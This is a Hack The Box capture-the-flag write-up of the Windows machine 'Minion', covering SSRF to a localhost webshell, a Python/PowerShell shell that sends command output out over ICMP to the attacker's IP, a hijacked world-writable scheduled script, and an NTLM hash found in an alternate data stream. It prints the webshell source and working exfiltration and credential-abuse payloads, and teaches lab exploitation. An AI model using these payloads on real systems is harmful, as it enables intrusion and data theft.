---
title: HTB: Minion
url: https://0xdf.gitlab.io/2022/04/07/htb-minion.html
date: 2022-04-07T09:00:00+00:00
difficulty: Insane [50]
os: Windows
tags: htb-minion, hackthebox, ctf, nmap, windows, asp, aspx, iis, feroxbuster, webshell, wfuzz, ssrf, icmp-exfil, youtube, python, powershell, python-cmd, powershell-runas, alternative-data-streams, crackstation, ghidra, htb-nest
---

![Minion](https://0xdfimages.gitlab.io/img/minion-cover.png)

Minion is four and a half years old, but it’s still really difficult. The steps themselves are not that hard, but the difficulty comes with the firewall that only allows ICMP out. So while I find a blind command execution relatively quickly, I’ll have to write my own shell using Python and PowerShell to exfil data over pings. The rest of the steps are also not hard on their own, just difficult to work through my ICMP shell. I’ll hijack a writable PowerShell script that runs on a schedule, and then find a password from the Administrator user in an alternative data stream on a backup file to get admin access.

## Box Info

| Name | [Minion](https://hackthebox.com/machines/minion)  [Minion](https://hackthebox.com/machines/minion) [Play on HackTheBox](https://hackthebox.com/machines/minion) |
| --- | --- |
| Release Date | [07 Oct 2017](https://twitter.com/hackthebox_eu/status/915500980028035073) |
| Retire Date | 31 Mar 2018 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Minion |
| Radar Graph | Radar chart for Minion |
| First Blood User | 15:20:12[del_ElaK4vz5 del\_ElaK4vz5](https://app.hackthebox.com/users/1531) |
| First Blood Root | 17:21:10[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| Creator | [decoder decoder](https://app.hackthebox.com/users/1391) |

## Recon

### nmap

`nmap` finds a single open TCP port serving HTTP (62696):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.57
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-05 01:08 UTC
Nmap scan report for 10.10.10.57
Host is up (0.091s latency).
Not shown: 65534 filtered ports
PORT      STATE SERVICE
62696/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.69 seconds
oxdf@hacky$ nmap -p 62696 -sCV -oA scans/nmap-tcpscripts 10.10.10.57
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-05 01:09 UTC
Nmap scan report for 10.10.10.57
Host is up (0.085s latency).

PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/backend
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.63 seconds

```

Based on the [IIS Version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running Windows 8.1 or Server 2012 R2. `nmap` also notes the `robots.txt`.

### Website - TCP 80

#### Site

The site is a fan-club for the Minions:

![image-20220404211147325](https://0xdfimages.gitlab.io/img/image-20220404211147325.png)

The link is an external link to the author’s blog, and otherwise there’s not much here.

`nmap` did identify a `robots.txt` file. It identifies the `/backend` path:

```

User-agent: *
Disallow: /backend

```

Visiting that just returns:

```

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Vary: Accept-Encoding
Server: Microsoft-IIS/8.5
Set-Cookie: ASPSESSIONIDCCSDSSRA=LKPPKPACGFAOPJNAIOFNFBOD; path=/
X-Powered-By: ASP.NET
Date: Tue, 05 Apr 2022 10:52:12 GMT
Connection: close
Content-Length: 20

Instance not running

```

Not much I can do with that. I’ll make sure to directory brute force in this path to see if it finds anything else.

#### Tech Stack

The response headers show not only that the server is IIS, but also that it’s ASP.NET:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 05 Sep 2017 15:39:06 GMT
Accept-Ranges: bytes
ETag: "4cbddf1b5d26d31:0"
Vary: Accept-Encoding
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Tue, 05 Apr 2022 01:11:11 GMT
Connection: close
Content-Length: 458

```

Trying to guess the index, `index.html`, `index.asp`, and `index.aspx` all return 404 errors.

There is a comment in the HTML source:

```

<!--
TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu
-->

```

This just decodes to to the first three lines of [Dante’s Inferno](http://www.worldofdante.org/comedy/dante/inferno.xml/1.1).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x asp,aspx` as I know it’s ASP, but I don’t know which extension. I’ll also use a all lowercase wordlist since Windows is case-insensitive:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.57:62696 -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.57:62696
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [asp, aspx]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        7w       41c http://10.10.10.57:62696/test.asp
301      GET        2l       10w      156c http://10.10.10.57:62696/backend => http://10.10.10.57:62696/backend/
200      GET        1l        3w       20c http://10.10.10.57:62696/backend/default.asp
[####################] - 2m    159498/159498  0s      found:3       errors:0      
[####################] - 2m     79749/79749   491/s   http://10.10.10.57:62696 
[####################] - 2m     79749/79749   491/s   http://10.10.10.57:62696/backend 

```

It finds `/backend`, as well as `default.asp` inside that. `default.asp` is just the same “Instance not running” message.

There’s also a `test.asp` in the root.

#### test.asp

Visiting `test.asp` returns an error:

![image-20220405082333490](https://0xdfimages.gitlab.io/img/image-20220405082333490.png)

It’s suggesting I need to pass a URL (likely in the `u` parameter). When I try `test.asp?u=http://10.10.14.6/`, it returns a 500 error:

![image-20220405082506299](https://0xdfimages.gitlab.io/img/image-20220405082506299.png)

This means the server crashed. When I try `test.asp?u=http://10.10.10.57:62696/`, it returns the Minions site:

![image-20220405082600446](https://0xdfimages.gitlab.io/img/image-20220405082600446.png)

## Shell as defaultapppool

### Blind RCE Via Admin Panel

#### Fuzz for Open Ports

It seems that `test.asp` cannot access pages on my host, but it can load pages from Minion itself. I’ll use `wfuzz` to try all ports, hiding any 500 responses with `--hc 500`:

```

oxdf@hacky$ wfuzz -u http://10.10.10.57:62696/test.asp?u=http://10.10.10.57:FUZZ/ -z range,1-65535 --hc 500
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.57:62696/test.asp?u=http://10.10.10.57:FUZZ/
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                
===================================================================

000000080:   200        0 L      0 W      0 Ch        "80"
000005985:   200        0 L      0 W      0 Ch        "5985"
000047001:   200        0 L      0 W      0 Ch        "47001"
000062696:   200        13 L     37 W     458 Ch      "62696"

Total time: 7341.232
Processed Requests: 65535
Filtered Requests: 65531
Requests/sec.: 8.926974

```

This takes a long time to run completely, but it doesn’t take long to find port 80. Still, it’s an empty (0 character response. I’ll try the same scan, but this time using `127.0.0.1` instead of `10.10.10.57`:

```

oxdf@hacky$ wfuzz -u http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:FUZZ/ -z range,1-65535 --hc 5
00
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:FUZZ/
Total requests: 65535

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                
===================================================================

000000080:   200        12 L     25 W     323 Ch      "80"
000005985:   200        0 L      0 W      0 Ch        "5985"
000047001:   200        0 L      0 W      0 Ch        "47001"
000062696:   200        13 L     37 W     458 Ch      "62696"

Total time: 7341.611
Processed Requests: 65535
Filtered Requests: 65531
Requests/sec.: 8.926514

```

This time the response is not empty.

Both scan also find WinRM-related ports (5985 and 470001).

#### Site Administration

The site on localhost is titled Site Administration:

![image-20220405084042030](https://0xdfimages.gitlab.io/img/image-20220405084042030.png)

It’s a bit strange that the first four links show as visited given I’ve never been to this site before. That’s because they each lead to the current location, `http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/`.

The last one is different, leading to `http://127.0.0.1/cmd.aspx`. Clicking that will lead my browser to try to load `cmd.aspx` off my host, which doesn’t exist. But I can visit it via `test.asp`, and it presents a simple webshell:

![image-20220405084225083](https://0xdfimages.gitlab.io/img/image-20220405084225083.png)

#### Interacting with Webshell

Typing “whoami” into the field and hitting enter returns an error:

![image-20220405084744959](https://0xdfimages.gitlab.io/img/image-20220405084744959.png)

Looking for closely at the previous page source, it’s super simple:

```

<html>
<body>

<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>

```

The `action` is a POST to `cmd.aspx`, and since the full path isn’t given, that targets `http://10.10.10.57:62696/cmd.aspx`, which doesn’t exist. It’s also sending a parameter named `xcmd`. I can see this in my failed request in Burp as well:

```

POST /cmd.aspx HTTP/1.1
Host: 10.10.10.57:62696
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.57:62696/
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: close
Cookie: ASPSESSIONIDACQBQRTB=GEFBPLMBLIENILKPDIEMHAFA; ASPSESSIONIDCCSDSSRA=LKPPKPACGFAOPJNAIOFNFBOD; ASPSESSIONIDAASCSSQA=FECBOJBCDDJHILMFPBADGLND
Upgrade-Insecure-Requests: 1

xcmd=whoami

```

I can hope that this webshell accepts GET requests as well as post requests and put the parameter in the URL, and it works, kind of:

![image-20220405113553751](https://0xdfimages.gitlab.io/img/image-20220405113553751.png)

If I change `whoami` to something that doesn’t exist as a command like `0xdf`, it returns “Exit Status=1”. This fits, as a successful command typically returns 0, and otherwise shows an error. So I have probably code execution, but it’s blind.

### Connect Back Enumeration

When I think have blind execution, the first thing to verify it’s actually executing is to `ping` my host and watch for it on `tcpdump`. I’ll start it, and visit `http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=ping%20-n%201%2010.10.14.6`. `tcpdump` sees the ICMP packet:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:28:11.313557 IP 10.10.10.57 > 10.10.14.6: ICMP echo request, id 1, seq 268, length 40
21:28:11.313630 IP 10.10.14.6 > 10.10.10.57: ICMP echo reply, id 1, seq 268, length 40

```

Next I’ll try to connect back with an HTTP request. I’ll start a Python webserver, and pass `powershell -c '(new-object new.webclient).downloadstring("http://10.10.14.6")'` as `xcmd`, but there’s no connection. I’ll a bunch of other ports and other ways, but nothing will connect back to me except for ICMP.

### Shell over HTTP/ICMP

I’m going to write a Python script that will help me leak data and enumerate this host. I’m also going to need a short Powershell blob that will:
- run a command
- capture the results
- break the results into parts
- send the results back in ICMP packets

The Python script will:
- take the input command and build the PowerShell with it
- submit that PowerShell via the webshell
- capture ICMP packets from Minion
- extract the data from the packet and print it to the screen

[Scapy](https://scapy.readthedocs.io/en/latest/introduction.html) is a Python packet utility that can craft and sniff packets. I’ll use Scopy to handle the ICMP, and Python Cmd to make the script feel like a shell. It won’t have persistence between commands (I can’t `cd` for example), but otherwise it works pretty well. [This video](https://www.youtube.com/watch?v=itMImlUZP0E) shows the process of creating it:

The full script it [here](/files/minion-icmp-shell.py), and it runs like:

```

oxdf@hacky$ sudo python icmp_shell.py                                                                                         
minion> whoami                    
iis apppool\defaultapppool                                          
minion> pwd                       

Path
----
C:\windows\system32\inetsrv

minion> ls                        

    Directory: C:\windows\system32\inetsrv                          

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         8/10/2017   9:31 AM            config
d----         8/10/2017   9:31 AM            en
d----         8/10/2017   9:41 AM            en-US
-a---        10/28/2014   7:26 PM     121344 appcmd.exe
...[snip]...

```

## Execution as decoder.MINION

### Enumeration

#### Users / Home Dirs

The only user that looks to be a real account is decoder.MINION, making it the likely owner of `user.txt`:

```

Minion> ls \users\

    Directory: C:\users

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         8/10/2017   9:43 AM            .NET v2.0                         
d----         8/10/2017   9:43 AM            .NET v2.0 Classic                 
d----         8/10/2017   9:32 AM            .NET v4.5                         
d----         8/10/2017   9:32 AM            .NET v4.5 Classic                 
d----         9/22/2017  11:33 AM            Administrator                     
d----         8/10/2017   9:43 AM            Classic .NET AppPool              
d----         9/22/2017  11:36 AM            decoder.MINION                    
d-r--         8/22/2013   8:39 AM            Public  

```

I can’t access anything in that directory or the Administrator directory from this shell.

#### Web

I can check out the web directories. `C:\inetpub\wwwroot\cmd.aspx` shows how it runs a command:

```

<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">
Function RunCmd(command)
  Dim res as integer
  Dim myProcess As New Process()
  Dim myProcessStartInfo As New ProcessStartInfo("c:\windows\system32\cmd.exe")
  myProcessStartInfo.UseShellExecute = false
  myProcessStartInfo.RedirectStandardOutput = true
  myProcess.StartInfo = myProcessStartInfo
  myProcessStartInfo.Arguments="/c " + command
  myProcess.Start()
  Dim myStreamReader As StreamReader = myProcess.StandardOutput
  Dim myString As String = myStreamReader.Readtoend()
  res=myProcess.ExitCode
  myProcess.Close()

  RunCmd= res
End Function
</script>

<html>
<body>
<%
dim t as integer
if request("xcmd") <> "" then
   t=RunCmd(request("xcmd"))
    response.write("Exit Status=" &t)
end if
%>
<form action="cmd.aspx" method=POST>
<p>Enter your shell command: <input type=text name=xcmd size=40> </form> </body> </html>

```

Not much else I can do with that now. I’ll notice that `test.asp` isn’t in the `C:\inetpub\wwwroot` directory. It’s actually in `C:\inetpub\public`:

```

Minion> ls -path \inetpub -Filter test.asp -recurse -erroraction silent

    Directory: C:\inetpub\public

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         8/10/2017  11:22 AM        463 test.asp 

```

So `C:\inetpub\public` seems to be the server on port 62696, and `C:\inetpub\wwwroot` is the one on 80 listening only on localhost.

This file does just what I thought, creating an `Msxml2.ServerXMLHTTP` object and using it to make a request, and returning the page:

```

<%
dim objHttp,strURL
if request("u") = "" then
   response.write "Missing Parameter Url [u] in GET request!"
else  
set objHttp = server.CreateObject("Msxml2.ServerXMLHTTP")
strURL = Request("u")
objHttp.open "GET", strURL, False
objHttp.Send

If objHttp.status = 200 Then
    Response.Expires = 90
    Response.ContentType = Request("mimeType")
    Response.BinaryWrite objHttp.responseBody
    set objHttp = Nothing
End If
 
end if
%>

```

#### sysadmscripts

In the root of the file system there’s an atypical directory, `sysadmscripts`:

```

Minion> ls \

    Directory: C:\

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----          9/4/2017   7:42 PM            accesslogs                        
d----         8/10/2017  10:43 AM            inetpub                           
d----         8/22/2013   8:52 AM            PerfLogs                          
d-r--         2/21/2022  10:47 AM            Program Files                     
d----         8/10/2017   9:42 AM            Program Files (x86)               
d----         8/24/2017   1:28 AM            sysadmscripts                     
d----         9/16/2017   2:41 AM            temp                              
d-r--          9/4/2017   7:41 PM            Users                             
d----         2/21/2022  11:02 AM            Windows   

```

It’s got two files in it:

```

Minion> ls \sysadmscripts

    Directory: C:\sysadmscripts

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         9/26/2017   6:24 AM        284 c.ps1                             
-a---         8/22/2017  10:46 AM        263 del_logs.bat 

```

`del_logs.bat` takes three actions:

```

@echo off
echo %DATE% %TIME% start job >> c:\windows\temp\log.txt
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -exec bypass -nop -file c:\sysadmscripts\c.ps1 c:\accesslogs 
echo %DATE% %TIME% stop job >> c:\windows\temp\log.txt

```

It writes start time to `C:\windows\temp\log.txt`, it runs `c.ps1` with the argument `c:\accesslogs`, and then it writes the stop time to `log.txt`. It doesn’t seem that I can read the `log.txt` file, but the last write time was 4.5 minutes ago:

```

Minion> ls \windows\temp\log.txt

    Directory: C:\windows\temp

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          4/6/2022   7:36 PM     214690 log.txt                           

Minion> date

Wednesday, April 6, 2022 7:40:31 PM

```

After another minute or two, the time is updated:

```

Minion> ls \windows\temp\log.txt

    Directory: C:\windows\temp

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          4/6/2022   7:41 PM     214729 log.txt 

```

This indicates `del_logs.bat` is running every 5 minutes.

`c.ps1` is a simple loop, taking the folder as an argument, getting only files (`psiscontainer` returns true for directories, but not files), and then deleting them if they are older than one day:

```

$lifeTime=1; # days

foreach($arg in $args)
{
    write-host $arg

    dir $arg | where {!$_.psiscontainer} | foreach
    {
        if((get-date).subtract($_.LastWriteTime).Days -gt $lifeTime)
        {
            remove-item ($arg + '\' + $_) -force
        }
    }
}

```

Looking at the permissions on these files, `del_logs.bat` seems relatively locked down, but `c.ps1` is world-writable:

```

Minion> icacls \sysadmscripts\*
\sysadmscripts\c.ps1 NT AUTHORITY\SYSTEM:(F)
                     BUILTIN\Administrators:(F)
                     Everyone:(F)
                     BUILTIN\Users:(F)

\sysadmscripts\del_logs.bat NT AUTHORITY\SYSTEM:(F)
                            BUILTIN\Administrators:(F)
                            Everyone:(RX)
                            BUILTIN\Users:(RX)

```

### Enumerate Via c.ps1

#### Strategy

This is where some design decisions I made with my shell make this a bit harder. My shell is based on asynchronous comms, in the sense that commands are sent up via HTTP, and then back over ICMP. I know others who solved this box uploaded PowerShell over the HTTP webshell that ran continuously, getting new commands from the ICMP replies. If I had used that strategy here, I could just put that same PowerShell in `c.ps1` and get that same ICMP shell.

I’ll consider making changes to my shell. If I didn’t want to go all the way to ICMP tasking, I could run PowerShell that constantly reads from a file, executing commands in it and sending back results over ICMP, and then have commands I type use HTTP to write to that file.

#### decoder Desktop

Before I get to code changes, I’ll do some really basic enumeration, starting with the home directory of decoder.MINION. Noticing that the next run was less than 30 seconds away, I’ll backup the original `c.ps1` and update the original to list the files on decoder.MINION’s desktop, where I expect to find `user.txt`:

```

Minion> copy \sysadmscripts\c.ps1 \sysadmscripts\c.ps1.bak
Minion> echo 'dir C:\users\decoder.minion\desktop > C:\programdata\0xdf' > \sysadmscripts\c.ps1

```

After that runs, there’s data in `\programdata\0xdf`:

```

Minion> cat \programdata\0xdf

    Directory: C:\users\decoder.minion\desktop

Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
-a---          9/4/2017   7:19 PM     103297 backup.zip                        
-a---         8/25/2017  11:09 AM         33 user.txt

```

I’ll copy both those files to somewhere I can read:

```

Minion> echo 'copy C:\users\decoder.minion\desktop\* C:\programdata\' > \sysadmscripts\c.ps1

```

Once that runs, I can read `user.txt`:

```

Minion> type \programdata\user.txt
40b949f9************************

```

## Shell as Administrator

### backup.zip

#### Exfil Fails

My first thought was to get this off the server by copying it into one of the web directories, and then downloading it. I believe that the web user doesn’t have write access to these folders, as they all failed:

```

Minion> copy C:\programdata\backup.zip C:\inetpub\public\backend\backup.zip
Minion> copy C:\programdata\backup.zip C:\inetpub\public\backup.zip
Minion> copy C:\programdata\backup.zip C:\inetpub\wwwroot\backup.zip

```

The file is also too large to base64 encode and copy off.

#### Extract on Minion

Given that, I’ll enumerate the file on Minion. Today I would use `Expand-Archive` to extract the file, but that isn’t present on this host. It’s running PowerShell version 4, and that commandlet came in 5:

```

Minion> Get-Host | Select-Object Version

Version                                                                        
-------                                                                        
4.0 

```

Instead, I can use the answer from [this StackOverflow post](https://stackoverflow.com/a/27768628):

```

Minion> Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\programdata\backup.zip', 'C:\programdata\')

```

There’s now a `secret.exe` file in `C:\programdata`.

Running it just prints the current directory:

```

Minion> \programdata\secret.exe
Current directory is: C:\windows\system32\inetsrv

```

I was considering a Beyond Root section opening this ins Ghidra, but on opening it, it’s clear there’s not much there. The entire `main` function is:

```

int main(int _Argc,char **_Argv,char **_Env)

{
  CHAR local_118 [268];
  DWORD local_c;
  
  __main();
  local_c = GetCurrentDirectoryA(0x104,local_118);
  printf("Current directory is: %s\n",local_118);
  return 0;
}

```

#### ADS

The above executable is actually a bit of a rabbit hole, but there’s more to `backup.zip`. It has an alternative data stream (ADS) in the file. I’ve dealt with [ADS before](/tags#alternative-data-streams), but not in a while, most recently in [Nest](/2020/06/06/htb-nest.html#enumeration-1).

I can show ADS with `dir` in `cmd` using the `/R` switch:

```

Minion> cmd /C dir /R \programdata\backup.zip
 Volume in drive C has no label.
 Volume Serial Number is F4AB-8486

 Directory of C:\programdata

09/04/2017  07:19 PM           103,297 backup.zip
                                    34 backup.zip:pass:$DATA
               1 File(s)        103,297 bytes
               0 Dir(s)   3,758,153,728 bytes free

```

Alternatively, `Get-Item` with `-Streams` will also get it in PowerShell:

```

Minion> Get-Item \programdata\backup.zip -stream *

   FileName: C:\programdata\backup.zip

Stream                   Length
------                   ------
:$DATA                   103297
pass                         34

```

There’s a 34-byte stream called `pass` on this file.

Specifying the stream name, I’ll dump the data, and see it’s a hash:

```

Minion> cat \programdata\backup.zip -stream pass
28a5d1e0c15af9f8fce7db65d75bbf17

```

Dropping that hash in to [CrackStation](https://crackstation.net), it identifies it as an NTLM hash, and returns the password, “1234test”:

[![image-20220406120358939](https://0xdfimages.gitlab.io/img/image-20220406120358939.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220406120358939.png)

### Filesystem as Administrator

I’ll check if these creds work for the administrator with `net use`, mounting the `c$` share:

```

Minion> net use \\localhost\c$ /u:minion\administrator 1234test
The command completed successfully.

```

Through this share I can read the administrator’s desktop:

```

Minion> dir \\localhost\c$\users\administrator\desktop

    Directory: \\localhost\c$\users\administrator\desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         9/26/2017   6:18 AM     386479 root.exe                          
-a---         8/24/2017  12:32 AM         76 root.txt

```

Right away I notice the `root.txt` is the wrong size. It’s a message:

```

Minion> cat \\localhost\c$\users\administrator\desktop\root.txt
In order to get the flag you have to launch root.exe located in this folder!

```

This step is put in place to exactly prevent what I’m trying to do. In order to get the flag, I’ll need to get execution as Administrator, not just read access to the desktop.

### Update Shell

I’ll copy my `icmp_shell.py` script and make some small changes to the PowerShell that is run via the webshell. The previous one looked like this (with added whitespace for readability):

```

$cmd="{cmd}"
$s=1000
$ip='10.10.14.6'
$r=[System.Text.Encoding]::ASCII.GetBytes((iex -command $cmd 2>&1|out-string))
$ping=New-Object System.Net.NetworkInformation.Ping
$opts=New-Object System.Net.NetworkInformation.PingOptions
$opts.DontFragment=$true
$i=0
while ($i -lt $r.length) {
    $ping.send($ip,5000,$r[$i..($i+$s)],$opts)
    $i=$i+$s
}

```

It takes a command and runs it using `iex` (short for `Invoke-Expression`). I’ll update that to:

```

$s=1000
$ip='10.10.14.6'
$pass="1234test"|ConvertTo-SecureString -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential("minion\\administrator", $pass)
$r=[System.Text.Encoding]::ASCII.GetBytes((invoke-command -computername localhost -credential $cred -scriptblock {{ {cmd} }}|out-string))
$ping=New-Object System.Net.NetworkInformation.Ping
$opts=New-Object System.Net.NetworkInformation.PingOptions
$opts.DontFragment=$true
$i=0
while ($i -lt $r.length) {
    $ping.send($ip,5000,$r[$i..($i+$s)],$opts)
    $i=$i+$s
}

```

This one instead creates a `PSCredential` object with the Administrator’s creds, and then uses `Invoke-Command` to run a command as Administrator.

With the new shell, commands are executed as administrator:

```

oxdf@hacky$ sudo python icmp_shell_admin.py 
Minion> whoami
minion\administrator

```

If I try to run `root.txt` from any random directory, it accuses me of cheating:

```

Minion> \users\administrator\desktop\root.exe
Are you trying to cheat me?

```

So I’ll `cd` into the desktop dir and run it and get the flag:

```

Minion> cd \users\administrator\desktop\; .\root.exe
25afc18b***********************1

```

### Alternative Flag Recovery via RE

#### Exfil

With filesystem access, I’ll copy `root.txt` to the `public` webserver folder:

```

Minion> copy \\localhost\c$\users\administrator\desktop\root.exe \\localhost\c$\inetpub\public\

```

It’s important to note that both paths are via the share. Now I can download it from `http://10.10.10.57/root.exe`.

#### Ghidra

I’ll load the file into Ghidra, let it analyze, and then find `main`. The decompile isn’t great, but it’s good enough that I can figure out what’s going on:

[![image-20220406125157603](https://0xdfimages.gitlab.io/img/image-20220406125157603.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220406125157603.png)
1. It’s getting the current directory
2. Compare the current directory to `C:\users\administrator\desktop`
3. If it doesn’t match, print “Are you trying to cheat me?” and exit.
4. Call `encryptDecrypt`, taking in a weird string and maybe some other stuff (but maybe not?).
5. Print “1”

Looking at `encryptDecrypt`, as I suspected, only the first `param1` is even referenced. I’ll edit the function signature to make it look better

![image-20220406125313756](https://0xdfimages.gitlab.io/img/image-20220406125313756.png)

This one is very simple, and the decompile is good:

![image-20220406125429102](https://0xdfimages.gitlab.io/img/image-20220406125429102.png)

It’s just looping over the input string, adding 3 to each byte, and printing that character.

I can generate that myself in a Python terminal:

```

>>> x = '/2^c`.5_423a_.2-521/5-.26/5^.`c'
>>> ''.join([chr(ord(c)+3) for c in x])
'25afc18b756db15085428015928a1cf'

```

The result is 31 characters, one short of a typically HTB flag:

```

>>> len(''.join([chr(ord(c)+3) for c in x]))
31

```

But I’ll remember a 1 is printed in `main`, so the flag is:

```

>>> ''.join([chr(ord(c)+3) for c in x]) + '1'
'25afc18b************************'

```